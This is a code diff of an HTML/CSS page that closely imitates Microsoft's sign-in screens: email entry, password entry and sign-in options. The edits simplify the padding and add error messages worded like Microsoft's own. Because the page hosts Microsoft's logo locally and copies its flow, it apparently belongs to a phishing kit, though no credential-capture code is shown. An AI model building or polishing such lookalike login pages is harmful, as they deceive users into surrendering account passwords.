@@ -33,16 +33,9 @@
     }
     .form-box {
       background-color: #ffffff;
+      padding: 44px;
       box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      /* MODIFICATION START: Control padding inside to allow full-width line */
-      padding-top: 44px;
-      padding-bottom: 44px;
     }
-    .form-box-content {
-        padding-left: 44px;
-        padding-right: 44px;
-    }
-    /* MODIFICATION END */
     .form-box h1 {
       font-size: 24px;
       font-weight: 600;
@@ -53,8 +46,8 @@
       border: 0;
       border-bottom: 1px solid #8A8886;
       border-radius: 0;
+      padding-left: 0;
       font-size: 16px;
-      padding-left: 0; /* Text starts at the edge of the input */
     }
     .form-control:focus {
       box-shadow: none;
@@ -91,6 +84,7 @@
     }
     .form-box .btn {
       font-size: 15px;
+      /* MODIFICATION: Increased button padding for a larger size */
       padding: 8px 30px;
       border: none;
       border-radius: 2px;
@@ -134,6 +128,7 @@
         margin-left: 16px;
         text-decoration: none;
     }
+    /* Styles for the "Sign-in options" detailed view */
     .option-item {
         display: flex;
         align-items: center;
@@ -177,45 +172,38 @@
       <div class="form-box">
         <!-- Email View -->
         <div id="div1">
-          <div class="form-box-content">
-            <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
-            <h1 class="mt-4">Sign in</h1>
-          </div>
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <h1 class="mt-4">Sign in</h1>
+          <span id="error" class="text-danger" style="display:none; font-size: 13px;">That Microsoft account doesn't exist. Enter a different account.</span>
           <div class="form-group mt-2">
             <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" autocomplete="email" autocapitalize="none">
           </div>
-          <div class="form-box-content">
-            <p>No account? <a href="#">Create one!</a></p>
-            <p><a href="#">Can’t access your account?</a></p>
-            <div class="button-container mt-4">
-              <button class="btn btn-primary-blue" id="next">Next</button>
-            </div>
+          <p>No account? <a href="#">Create one!</a></p>
+          <p><a href="#">Can’t access your account?</a></p>
+          <div class="button-container mt-4">
+            <button class="btn btn-primary-blue" id="next">Next</button>
           </div>
         </div>
 
         <!-- Password View -->
         <div id="div2" style="display:none;">
-          <div class="form-box-content">
-              <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
-              <div class="mt-4">
-                  <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" style="font-size:15px;"></span>
-              </div>
-              <h1 class="mt-3">Enter password</h1>
+          <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
+          <div class="mt-4">
+              <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" style="font-size:15px;"></span>
           </div>
+          <h1 class="mt-3">Enter password</h1>
+          <span id="msg" class="text-danger" style="display:none; font-size: 13px;">Please enter your password.</span>
           <div class="form-group mt-2">
             <input type="password" class="form-control" id="password" placeholder="Password" autocomplete="current-password">
           </div>
-          <div class="form-box-content">
-            <p><a href="#">Forgot my password</a></p>
-            <div class="button-container mt-4">
-              <button class="btn btn-primary-blue" id="submit-btn">Sign in</button>
-            </div>
+          <p><a href="#">Forgot my password</a></p>
+          <div class="button-container mt-4">
+            <button class="btn btn-primary-blue" id="submit-btn">Sign in</button>
           </div>
         </div>
         
         <!-- Detailed "Sign-in options" View (hidden by default) -->
         <div id="options_view_detailed" style="display:none;">
-          <div class="form-box-content">
             <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
             <h1 class="mt-4">Sign-in options</h1>
             <div class="option-item">
@@ -239,7 +227,6 @@
             <div class="button-container mt-4">
                 <button class="btn btn-secondary-gray" id="options-view-back">Back</button>
             </div>
-          </div>
         </div>
       </div>
 
